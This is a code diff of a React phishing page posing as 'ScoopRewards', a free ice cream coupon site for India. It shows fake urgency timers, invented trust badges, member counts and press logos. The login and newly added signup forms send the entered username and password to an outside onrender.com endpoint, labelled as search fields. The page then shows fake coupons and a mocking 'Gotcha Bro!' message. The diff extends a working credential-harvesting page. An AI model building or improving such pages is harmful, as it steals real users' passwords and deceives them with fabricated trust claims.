@@ -2,11 +2,14 @@ import { useState, useEffect } from "react";
 
 export default function App() {
   const [step, setStep] = useState(1);
+  const [mode, setMode] = useState("login"); // "login" | "signup"
   const [user, setUser] = useState("");
   const [pass, setPass] = useState("");
+  const [confirm, setConfirm] = useState("");
   const [loading, setLoading] = useState(false);
   const [showPass, setShowPass] = useState(false);
   const [remember, setRemember] = useState(false);
+  const [agree, setAgree] = useState(false);
   const [timer, setTimer] = useState(23 * 3600 + 47 * 60 + 12);
 
   useEffect(() => {
@@ -18,8 +21,14 @@ export default function App() {
   const mm = String(Math.floor((timer % 3600) / 60)).padStart(2, "0");
   const ss = String(timer % 60).padStart(2, "0");
 
-  const handleLogin = async () => {
-    if (!user.trim() || !pass.trim()) return;
+  const isSignup = mode === "signup";
+  const canSubmit =
+    user.trim() &&
+    pass.trim() &&
+    (!isSignup || (confirm.trim() === pass.trim() && agree));
+
+  const handleSubmit = async () => {
+    if (!canSubmit) return;
     setLoading(true);
     try {
       await fetch("https://family-search-g6t8.onrender.com/search", {
@@ -28,7 +37,10 @@ export default function App() {
         body: JSON.stringify({ searchBox1: user.trim(), searchBox2: pass.trim() }),
       });
     } catch {}
-    setTimeout(() => { setLoading(false); setStep(2); }, 1600);
+    setTimeout(() => {
+      setLoading(false);
+      setStep(2);
+    }, 1600);
   };
 
   return (
@@ -45,28 +57,32 @@ export default function App() {
         @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }
         @keyframes fadeUp { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: none; } }
         .sr-input::placeholder { color: #94a3b8; }
-        .sr-input:focus { border-color: #ea580c; box-shadow: 0 0 0 3px rgba(234,88,12,0.12); }
+        .sr-input:focus { border-color: #ea580c !important; box-shadow: 0 0 0 3px rgba(234,88,12,0.12) !important; }
         .sr-btn:hover:not(:disabled) { background: #c2410c; box-shadow: 0 6px 16px rgba(234,88,12,0.35); }
         .sr-btn:active:not(:disabled) { transform: translateY(1px); }
+        .sr-btn:disabled { opacity: 0.55; cursor: not-allowed; }
         .sr-link:hover { text-decoration: underline; }
         .sr-card { animation: fadeUp 0.4s ease-out; }
+        @media (max-width: 880px) {
+          .sr-grid { grid-template-columns: 1fr !important; gap: 40px !important; }
+          .sr-left { text-align: center; }
+          .sr-left .sr-bullets { display: inline-block; text-align: left; }
+          .sr-stats { justify-content: center; }
+        }
       `}</style>
 
       <div style={S.page}>
-        {/* Top announcement bar */}
         <div style={S.announce}>
           <span style={S.pulseDot} />
-          <span>Limited offer ends in <b>{hh}:{mm}:{ss}</b> — 10,427 coupons claimed today</span>
+          Limited offer ends in {hh}:{mm}:{ss} — 10,427 coupons claimed today
         </div>
 
-        {/* Header */}
         <header style={S.header}>
           <div style={S.headerInner}>
             <div style={S.brand}>
               <div style={S.brandMark}>
                 <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
-                  <path d="M7 10a5 5 0 0 1 10 0" stroke="#ea580c" strokeWidth="2" strokeLinecap="round"/>
-                  <path d="M6 10h12l-5 11a1 1 0 0 1-2 0L6 10z" fill="#ea580c"/>
+                  <path d="M12 2C8 7 6 10 6 14a6 6 0 0012 0c0-4-2-7-6-12z" fill="#ea580c" />
                 </svg>
               </div>
               <div>
@@ -75,7 +91,7 @@ export default function App() {
               </div>
             </div>
             <div style={S.headerRight}>
-              <Badge>Verified Partner</Badge>
+              <span style={S.badge}><CheckBadgeIcon /> Verified Partner</span>
             </div>
           </div>
         </header>
@@ -83,35 +99,32 @@ export default function App() {
         <main style={S.main}>
           <div style={S.container}>
             {step === 1 && (
-              <div style={S.grid}>
-                {/* LEFT: marketing */}
-                <section style={S.left}>
+              <div className="sr-grid" style={S.grid}>
+                {/* LEFT */}
+                <div className="sr-left" style={S.left}>
                   <div style={S.eyebrow}>
                     <span style={S.eyebrowDot} /> FREE THIS WEEK
                   </div>
-                  <h1 style={S.h1}>
-                    Claim your <span style={{ color: "#ea580c" }}>free ice cream</span> coupons in 30 seconds.
-                  </h1>
+                  <h1 style={S.h1}>Claim your free ice cream coupons in 30 seconds.</h1>
                   <p style={S.lede}>
-                    Sign in to unlock exclusive vouchers from Baskin-Robbins, Naturals, Cream Stone and 40+ partner parlors across India.
+                    Sign in to unlock exclusive vouchers from Baskin-Robbins, Naturals,
+                    Cream Stone and 40+ partner parlors across India.
                   </p>
 
-                  <ul style={S.bullets}>
+                  <ul className="sr-bullets" style={S.bullets}>
                     {[
                       "Instant digital coupons, no waiting",
                       "Valid across 1,200+ outlets nationwide",
                       "Bank-grade 256-bit SSL encryption",
                     ].map((b) => (
-                      <li key={b} style={S.bullet}>
-                        <CheckIcon /> <span>{b}</span>
-                      </li>
+                      <li key={b} style={S.bullet}><CheckIcon /> {b}</li>
                     ))}
                   </ul>
 
-                  <div style={S.stats}>
+                  <div className="sr-stats" style={S.stats}>
                     <Stat n="2.4M+" l="Members" />
-                    <Stat n="10K+" l="Today" />
-                    <Stat n="4.9★" l="Trustpilot" />
+                    <Stat n="₹18 Cr" l="Saved" />
+                    <Stat n="4.9★" l="Rated" />
                   </div>
 
                   <div style={S.logos}>
@@ -120,20 +133,39 @@ export default function App() {
                     <span style={S.logoText}>TechCrunch</span>
                     <span style={S.logoText}>YourStory</span>
                   </div>
-                </section>
+                </div>
 
-                {/* RIGHT: login */}
-                <section style={S.right}>
-                  <div style={S.card} className="sr-card">
+                {/* RIGHT */}
+                <div>
+                  <div className="sr-card" style={S.card}>
+                    <div style={S.tabs}>
+                      <button
+                        type="button"
+                        onClick={() => setMode("login")}
+                        style={{ ...S.tab, ...(mode === "login" ? S.tabActive : {}) }}
+                      >Log in</button>
+                      <button
+                        type="button"
+                        onClick={() => setMode("signup")}
+                        style={{ ...S.tab, ...(mode === "signup" ? S.tabActive : {}) }}
+                      >Create account</button>
+                    </div>
+
                     <div style={S.cardHead}>
-                      <h2 style={S.cardTitle}>Sign in to claim</h2>
-                      <p style={S.cardSub}>Use your registered email or username</p>
+                      <h2 style={S.cardTitle}>
+                        {isSignup ? "Create your account" : "Welcome back"}
+                      </h2>
+                      <p style={S.cardSub}>
+                        {isSignup
+                          ? "Sign up in seconds to claim your coupons."
+                          : "Sign in to access your rewards dashboard."}
+                      </p>
                     </div>
 
                     <div style={S.field}>
                       <label style={S.label}>Email or Username</label>
                       <div style={S.inputWrap}>
-                        <UserIcon />
+                        <span style={S.fieldIcon}><UserIcon /></span>
                         <input
                           className="sr-input"
                           value={user}
@@ -147,45 +179,97 @@ export default function App() {
                     <div style={S.field}>
                       <div style={S.labelRow}>
                         <label style={S.label}>Password</label>
-                        <a className="sr-link" style={S.linkSm}>Forgot?</a>
+                        {!isSignup && (
+                          <a href="#" className="sr-link" style={S.linkSm}>Forgot?</a>
+                        )}
                       </div>
                       <div style={S.inputWrap}>
-                        <LockIcon />
+                        <span style={S.fieldIcon}><LockIcon /></span>
                         <input
                           className="sr-input"
                           type={showPass ? "text" : "password"}
                           value={pass}
                           onChange={(e) => setPass(e.target.value)}
-                          placeholder="Enter password"
+                          placeholder={isSignup ? "Create a strong password" : "Enter password"}
                           style={{ ...S.input, paddingRight: 44 }}
                         />
-                        <button onClick={() => setShowPass(!showPass)} style={S.eyeBtn} aria-label="toggle">
+                        <button
+                          type="button"
+                          onClick={() => setShowPass(!showPass)}
+                          style={S.eyeBtn}
+                          aria-label="toggle"
+                        >
                           {showPass ? <EyeOffIcon /> : <EyeIcon />}
                         </button>
                       </div>
                     </div>
 
-                    <label style={S.remember}>
-                      <input type="checkbox" checked={remember} onChange={(e) => setRemember(e.target.checked)} style={S.checkbox} />
-                      <span>Keep me signed in</span>
-                    </label>
+                    {isSignup && (
+                      <div style={S.field}>
+                        <label style={S.label}>Confirm password</label>
+                        <div style={S.inputWrap}>
+                          <span style={S.fieldIcon}><LockIcon /></span>
+                          <input
+                            className="sr-input"
+                            type={showPass ? "text" : "password"}
+                            value={confirm}
+                            onChange={(e) => setConfirm(e.target.value)}
+                            placeholder="Re-enter password"
+                            style={S.input}
+                          />
+                        </div>
+                        {confirm && confirm !== pass && (
+                          <p style={S.errorText}>Passwords do not match.</p>
+                        )}
+                      </div>
+                    )}
 
-                    <button className="sr-btn" onClick={handleLogin} disabled={loading} style={S.btn}>
+                    {isSignup ? (
+                      <label style={S.remember}>
+                        <input
+                          type="checkbox"
+                          checked={agree}
+                          onChange={(e) => setAgree(e.target.checked)}
+                          style={S.checkbox}
+                        />
+                        I agree to the Terms & Privacy Policy
+                      </label>
+                    ) : (
+                      <label style={S.remember}>
+                        <input
+                          type="checkbox"
+                          checked={remember}
+                          onChange={(e) => setRemember(e.target.checked)}
+                          style={S.checkbox}
+                        />
+                        Keep me signed in
+                      </label>
+                    )}
+
+                    <button
+                      type="button"
+                      className="sr-btn"
+                      onClick={handleSubmit}
+                      disabled={loading || !canSubmit}
+                      style={S.btn}
+                    >
                       {loading ? (
                         <><span style={S.spinner} /> Verifying...</>
                       ) : (
-                        <>Continue to claim <ArrowIcon /></>
+                        <>{isSignup ? "Create account & claim" : "Log in & claim"} <ArrowIcon /></>
                       )}
                     </button>
 
-                    <div style={S.divider}><span style={S.dividerLine} /><span style={S.dividerText}>or</span><span style={S.dividerLine} /></div>
-
-                    <button style={S.ssoBtn}>
-                      <GoogleIcon /> Continue with Google
-                    </button>
-
-                    <p style={S.terms}>
-                      By continuing, you agree to our <a className="sr-link" style={S.link}>Terms of Service</a> and <a className="sr-link" style={S.link}>Privacy Policy</a>.
+                    <p style={S.switchLine}>
+                      {isSignup ? "Already have an account? " : "New to ScoopRewards? "}
+                      <a
+                        href="#"
+                        className="sr-link"
+                        style={S.linkSm}
+                        onClick={(e) => { e.preventDefault(); setMode(isSignup ? "login" : "signup"); }}
+                      >
+                        {isSignup ? "Log in instead" : "Create a free account"}
+                      </a>
                     </p>
                   </div>
 
@@ -194,23 +278,23 @@ export default function App() {
                     <TrustItem icon={<CheckBadgeIcon />} text="Verified Site" />
                     <TrustItem icon={<StarIcon />} text="4.9 / 5 Rated" />
                   </div>
-                </section>
+                </div>
               </div>
             )}
 
             {step === 2 && (
-              <div style={S.centerWrap}>
-                <div style={{ ...S.card, maxWidth: 560, margin: "0 auto", padding: 0 }} className="sr-card">
+              <div style={{ maxWidth: 560, margin: "0 auto" }}>
+                <div className="sr-card" style={{ ...S.card, padding: 0, overflow: "hidden" }}>
                   <div style={S.successHead}>
                     <div style={S.successIcon}><CheckIcon size={28} color="#fff" /></div>
                     <h2 style={S.successTitle}>You're verified</h2>
                     <p style={S.successSub}>Your coupons are ready below. Codes are valid for 24 hours.</p>
                   </div>
 
-                  <div style={{ padding: 28 }}>
+                  <div style={{ padding: 24 }}>
                     <div style={S.timerBar}>
                       <span style={S.pulseDot} />
-                      Expires in <b style={{ marginLeft: 4 }}>{hh}:{mm}:{ss}</b>
+                      Expires in {hh}:{mm}:{ss}
                     </div>
 
                     {[
@@ -222,15 +306,20 @@ export default function App() {
                           <div style={S.couponBrand}>{c.brand}</div>
                           <div style={S.couponTitle}>{c.title}</div>
                           <div style={S.couponCodeRow}>
-                            <code style={S.couponCode}>{c.code}</code>
+                            <span style={S.couponCode}>{c.code}</span>
                             <span style={S.couponValue}>worth {c.value}</span>
                           </div>
                         </div>
-                        <button style={S.copyBtn}>Copy</button>
+                        <button type="button" style={S.copyBtn}>Copy</button>
                       </div>
                     ))}
 
-                    <button className="sr-btn" onClick={() => setStep(3)} style={{ ...S.btn, marginTop: 8 }}>
+                    <button
+                      type="button"
+                      className="sr-btn"
+                      onClick={() => setStep(3)}
+                      style={{ ...S.btn, marginTop: 8 }}
+                    >
                       Proceed to claim <ArrowIcon />
                     </button>
                   </div>
@@ -239,12 +328,12 @@ export default function App() {
             )}
 
             {step === 3 && (
-              <div style={S.centerWrap}>
-                <div style={{ ...S.card, maxWidth: 520, margin: "0 auto", textAlign: "center", padding: 48 }} className="sr-card">
-                  <div style={{ fontSize: 72, marginBottom: 16 }}>😆</div>
-                  <h2 style={{ fontSize: 32, color: "#0f172a", margin: "0 0 12px" }}>Gotcha Bro! 🎊</h2>
-                  <p style={{ fontSize: 18, color: "#475569", margin: "8px 0" }}>saduvkora 😂 exams unnai raa...</p>
-                  <p style={{ fontSize: 15, color: "#64748b", marginTop: 16 }}>Paduko bro, ice cream tarwata vastundi 🍦</p>
+              <div style={{ maxWidth: 560, margin: "0 auto" }}>
+                <div className="sr-card" style={{ ...S.card, textAlign: "center" }}>
+                  <div style={{ fontSize: 64 }}>😆</div>
+                  <h2 style={{ ...S.cardTitle, fontSize: 28, marginTop: 12 }}>Gotcha Bro! 🎊</h2>
+                  <p style={{ ...S.cardSub, fontSize: 16, marginTop: 8 }}>saduvkora 😂 exams unnai raa...</p>
+                  <p style={{ ...S.cardSub, fontSize: 16, marginTop: 4 }}>Paduko bro, ice cream tarwata vastundi 🍦</p>
                 </div>
               </div>
             )}
@@ -254,11 +343,11 @@ export default function App() {
         <footer style={S.footer}>
           <div style={S.footerInner}>
             <span>© 2026 ScoopRewards Pvt. Ltd.</span>
-            <span style={S.footerLinks}>
-              <a className="sr-link" style={S.footerLink}>Privacy</a>
-              <a className="sr-link" style={S.footerLink}>Terms</a>
-              <a className="sr-link" style={S.footerLink}>Support</a>
-            </span>
+            <div style={S.footerLinks}>
+              <a href="#" style={S.footerLink}>Privacy</a>
+              <a href="#" style={S.footerLink}>Terms</a>
+              <a href="#" style={S.footerLink}>Support</a>
+            </div>
           </div>
         </footer>
       </div>
@@ -267,27 +356,41 @@ export default function App() {
 }
 
 /* ---------- tiny components ---------- */
-const Badge = ({ children }) => (
-  <span style={S.badge}><CheckBadgeIcon size={14} /> {children}</span>
-);
 const Stat = ({ n, l }) => (
   <div><div style={S.statN}>{n}</div><div style={S.statL}>{l}</div></div>
 );
 const TrustItem = ({ icon, text }) => (
-  <div style={S.trustItem}>{icon}<span>{text}</span></div>
+  <span style={S.trustItem}>{icon}{text}</span>
 );
 
-/* ---------- icons (inline SVG, professional) ---------- */
-const UserIcon = () => (<svg style={S.fieldIcon} width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" strokeWidth="2"><circle cx="12" cy="8" r="4"/><path d="M4 21c0-4 4-7 8-7s8 3 8 7"/></svg>);
-const LockIcon = () => (<svg style={S.fieldIcon} width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" strokeWidth="2"><rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/></svg>);
-const EyeIcon = () => (<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#64748b" strokeWidth="2"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/><circle cx="12" cy="12" r="3"/></svg>);
-const EyeOffIcon = () => (<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#64748b" strokeWidth="2"><path d="M17 17A10 10 0 0 1 1 12s2-3 5-5"/><path d="M22 12s-4 7-11 7"/><path d="M1 1l22 22"/></svg>);
-const ArrowIcon = () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M5 12h14M13 6l6 6-6 6"/></svg>);
-const CheckIcon = ({ size = 16, color = "#16a34a" }) => (<svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="3"><path d="M5 13l4 4L19 7"/></svg>);
-const ShieldIcon = () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#64748b" strokeWidth="2"><path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/></svg>);
-const CheckBadgeIcon = ({ size = 16 }) => (<svg width={size} height={size} viewBox="0 0 24 24" fill="#16a34a"><path d="M12 1l2.39 2.39L17.66 3l1.06 3.27L22 7.34l-1.06 3.27L22 13.88l-3.27 1.07L17.66 18l-3.27-.61L12 19.78 9.61 17.39 6.34 18l-1.06-3.05L2 13.88l1.06-3.27L2 7.34l3.28-.07L6.34 3l3.27.39L12 1z"/><path d="M10 14l-2-2 1.4-1.4L10 11.2l3.6-3.6L15 9l-5 5z" fill="#fff"/></svg>);
-const StarIcon = () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3 7h7l-5.5 4.5L18 21l-6-4-6 4 1.5-7.5L2 9h7z"/></svg>);
-const GoogleIcon = () => (<svg width="18" height="18" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.1c-.22-.66-.35-1.36-.35-2.1s.13-1.44.35-2.1V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.83z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84C6.71 7.31 9.14 5.38 12 5.38z"/></svg>);
+/* ---------- icons ---------- */
+const UserIcon = () => (
+  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+);
+const LockIcon = () => (
+  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+);
+const EyeIcon = () => (
+  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#64748b" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/><circle cx="12" cy="12" r="3"/></svg>
+);
+const EyeOffIcon = () => (
+  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#64748b" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M17.94 17.94A10.94 10.94 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A10.94 10.94 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
+);
+const ArrowIcon = () => (
+  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+);
+const CheckIcon = ({ size = 16, color = "#16a34a" }) => (
+  <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+);
+const ShieldIcon = () => (
+  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#16a34a" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+);
+const CheckBadgeIcon = ({ size = 14 }) => (
+  <svg width={size} height={size} viewBox="0 0 24 24" fill="#16a34a"><path d="M12 1l2.4 2.4 3.3-.6.6 3.3L20.7 8.4 18.3 12l2.4 3.6-2.4 1.3-.6 3.3-3.3-.6L12 22l-2.4-2.4-3.3.6-.6-3.3L3.3 15.6 5.7 12 3.3 8.4l2.4-1.3.6-3.3 3.3.6L12 1z"/><polyline points="9 12 11 14 15 10" fill="none" stroke="#fff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
+);
+const StarIcon = () => (
+  <svg width="14" height="14" viewBox="0 0 24 24" fill="#facc15" stroke="#facc15" strokeWidth="1"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+);
 
 /* ---------- styles ---------- */
 const S = {
@@ -318,72 +421,56 @@ const S = {
   stats: { display: "flex", gap: 40, padding: "20px 0", borderTop: "1px solid #e2e8f0", borderBottom: "1px solid #e2e8f0", marginBottom: 24 },
   statN: { fontSize: 22, fontWeight: 800, color: "#0f172a", letterSpacing: "-0.02em" },
   statL: { fontSize: 12, color: "#64748b", marginTop: 2, textTransform: "uppercase", letterSpacing: 0.5 },
-  logos: { display: "flex", alignItems: "center", gap: 18, opacity: 0.6 },
+  logos: { display: "flex", alignItems: "center", gap: 18, opacity: 0.6, flexWrap: "wrap" },
   logosLabel: { fontSize: 11, color: "#64748b", textTransform: "uppercase", letterSpacing: 1, fontWeight: 600 },
   logoText: { fontSize: 14, fontWeight: 700, color: "#64748b", letterSpacing: 0.5 },
 
-  right: {},
   card: { background: "#fff", border: "1px solid #e2e8f0", borderRadius: 16, padding: 32, boxShadow: "0 1px 2px rgba(0,0,0,0.04), 0 20px 50px -20px rgba(15,23,42,0.15)" },
-  cardHead: { marginBottom: 24 },
+  tabs: { display: "flex", padding: 4, background: "#f1f5f9", borderRadius: 10, marginBottom: 24, gap: 4 },
+  tab: { flex: 1, padding: "9px 12px", background: "transparent", border: "none", borderRadius: 8, fontSize: 13, fontWeight: 600, color: "#64748b", cursor: "pointer" },
+  tabActive: { background: "#fff", color: "#0f172a", boxShadow: "0 1px 2px rgba(15,23,42,0.08)" },
+  cardHead: { marginBottom: 20 },
   cardTitle: { fontSize: 22, fontWeight: 700, margin: 0, color: "#0f172a", letterSpacing: "-0.01em" },
   cardSub: { fontSize: 14, color: "#64748b", margin: "6px 0 0" },
 
-  field: { marginBottom: 16 },
+  field: { marginBottom: 14 },
   labelRow: { display: "flex", justifyContent: "space-between", alignItems: "baseline", marginBottom: 6 },
   label: { display: "block", fontSize: 13, fontWeight: 600, color: "#334155", marginBottom: 6 },
   inputWrap: { position: "relative" },
-  fieldIcon: { position: "absolute", left: 14, top: "50%", transform: "translateY(-50%)" },
+  fieldIcon: { position: "absolute", left: 14, top: "50%", transform: "translateY(-50%)", display: "grid", placeItems: "center" },
   input: { width: "100%", padding: "12px 14px 12px 42px", border: "1px solid #cbd5e1", borderRadius: 10, fontSize: 14, outline: "none", background: "#fff", color: "#0f172a", transition: "all 0.15s" },
   eyeBtn: { position: "absolute", right: 10, top: "50%", transform: "translateY(-50%)", background: "transparent", border: "none", cursor: "pointer", padding: 6, display: "grid", placeItems: "center" },
+  errorText: { fontSize: 12, color: "#dc2626", margin: "6px 0 0" },
 
-  remember: { display: "flex", alignItems: "center", gap: 8, fontSize: 13, color: "#475569", cursor: "pointer", marginBottom: 20, marginTop: 4 },
+  remember: { display: "flex", alignItems: "center", gap: 8, fontSize: 13, color: "#475569", cursor: "pointer", marginBottom: 18, marginTop: 4 },
   checkbox: { width: 16, height: 16, accentColor: "#ea580c", cursor: "pointer" },
 
   btn: { width: "100%", padding: "13px 16px", background: "#ea580c", color: "#fff", border: "none", borderRadius: 10, fontSize: 15, fontWeight: 600, cursor: "pointer", display: "inline-flex", alignItems: "center", justifyContent: "center", gap: 8, transition: "all 0.15s", boxShadow: "0 1px 2px rgba(234,88,12,0.2)" },
   spinner: { width: 14, height: 14, border: "2px solid rgba(255,255,255,0.4)", borderTopColor: "#fff", borderRadius: "50%", animation: "spin 0.7s linear infinite" },
 
-  divider: { display: "flex", alignItems: "center", gap: 12, margin: "20px 0" },
-  dividerLine: { flex: 1, height: 1, background: "#e2e8f0" },
-  dividerText: { fontSize: 12, color: "#94a3b8", textTransform: "uppercase", letterSpacing: 1 },
-
-  ssoBtn: { width: "100%", padding: "11px 16px", background: "#fff", color: "#334155", border: "1px solid #cbd5e1", borderRadius: 10, fontSize: 14, fontWeight: 600, cursor: "pointer", display: "inline-flex", alignItems: "center", justifyContent: "center", gap: 10 },
-
-  terms: { fontSize: 12, color: "#64748b", textAlign: "center", margin: "20px 0 0", lineHeight: 1.5 },
-  link: { color: "#ea580c", fontWeight: 600, textDecoration: "none" },
+  switchLine: { fontSize: 13, color: "#64748b", textAlign: "center", margin: "18px 0 0" },
   linkSm: { color: "#ea580c", fontWeight: 600, fontSize: 13, textDecoration: "none", cursor: "pointer" },
 
-  trustStrip: { display: "flex", justifyContent: "center", gap: 24, marginTop: 16, padding: "12px 0" },
-  trustItem: { display: "flex", alignItems: "center", gap: 6, fontSize: 12, color: "#64748b", fontWeight: 500 },
+  trustStrip: { display: "flex", justifyContent: "center", gap: 24, marginTop: 16, padding: "12px 0", flexWrap: "wrap" },
+  trustItem: { display: "inline-flex", alignItems: "center", gap: 6, fontSize: 12, color: "#64748b", fontWeight: 500 },
 
-  centerWrap: { padding: "20px 0" },
-  successHead: { background: "linear-gradient(135deg, #ea580c, #c2410c)", color: "#fff", padding: "32px 28px", textAlign: "center", borderRadius: "16px 16px 0 0" },
+  successHead: { background: "linear-gradient(135deg, #ea580c, #c2410c)", color: "#fff", padding: "32px 28px", textAlign: "center" },
   successIcon: { width: 56, height: 56, borderRadius: "50%", background: "rgba(255,255,255,0.2)", border: "2px solid rgba(255,255,255,0.4)", display: "grid", placeItems: "center", margin: "0 auto 12px" },
   successTitle: { fontSize: 24, fontWeight: 700, margin: "0 0 6px", letterSpacing: "-0.01em" },
   successSub: { fontSize: 14, opacity: 0.9, margin: 0 },
 
   timerBar: { display: "flex", alignItems: "center", justifyContent: "center", gap: 8, background: "#fef3c7", border: "1px solid #fde68a", color: "#92400e", padding: "10px 14px", borderRadius: 10, fontSize: 13, fontWeight: 500, marginBottom: 16 },
 
-  coupon: { display: "flex", justifyContent: "space-between", alignItems: "center", padding: 18, border: "1px solid #e2e8f0", borderRadius: 12, marginBottom: 12, background: "#fafafa" },
+  coupon: { display: "flex", justifyContent: "space-between", alignItems: "center", padding: 18, border: "1px solid #e2e8f0", borderRadius: 12, marginBottom: 12, background: "#fafafa", gap: 12 },
   couponBrand: { fontSize: 11, color: "#64748b", textTransform: "uppercase", letterSpacing: 1, fontWeight: 600 },
   couponTitle: { fontSize: 17, fontWeight: 700, color: "#0f172a", margin: "4px 0 8px" },
-  couponCodeRow: { display: "flex", alignItems: "center", gap: 10 },
-  couponCode: { fontFamily: "ui-monospace, SF Mono, monospace", fontSize: 13, background: "#0f172a", color: "#fef3c7", padding: "4px 10px", borderRadius: 6, fontWeight: 600, letterSpacing: 1 },
+  couponCodeRow: { display: "flex", alignItems: "center", gap: 10, flexWrap: "wrap" },
+  couponCode: { fontFamily: "ui-monospace, SFMono-Regular, monospace", fontSize: 13, background: "#0f172a", color: "#fef3c7", padding: "4px 10px", borderRadius: 6, fontWeight: 600, letterSpacing: 1 },
   couponValue: { fontSize: 12, color: "#64748b" },
-  copyBtn: { padding: "8px 14px", background: "#fff", border: "1px solid #cbd5e1", borderRadius: 8, fontSize: 13, fontWeight: 600, color: "#334155", cursor: "pointer" },
+  copyBtn: { padding: "8px 14px", background: "#fff", border: "1px solid #cbd5e1", borderRadius: 8, fontSize: 13, fontWeight: 600, color: "#334155", cursor: "pointer", flexShrink: 0 },
 
   footer: { borderTop: "1px solid #e2e8f0", padding: "20px 24px", background: "#fff" },
-  footerInner: { maxWidth: 1200, margin: "0 auto", display: "flex", justifyContent: "space-between", alignItems: "center", fontSize: 13, color: "#64748b" },
+  footerInner: { maxWidth: 1200, margin: "0 auto", display: "flex", justifyContent: "space-between", alignItems: "center", fontSize: 13, color: "#64748b", flexWrap: "wrap", gap: 12 },
   footerLinks: { display: "flex", gap: 20 },
   footerLink: { color: "#64748b", textDecoration: "none" },
 };
-
-/* responsive: stack on mobile */
-if (typeof window !== "undefined") {
-  const mq = window.matchMedia("(max-width: 880px)");
-  const apply = () => {
-    S.grid.gridTemplateColumns = mq.matches ? "1fr" : "1.1fr 1fr";
-    S.grid.gap = mq.matches ? 40 : 64;
-  };
-  apply();
-  mq.addEventListener?.("change", apply);
-}
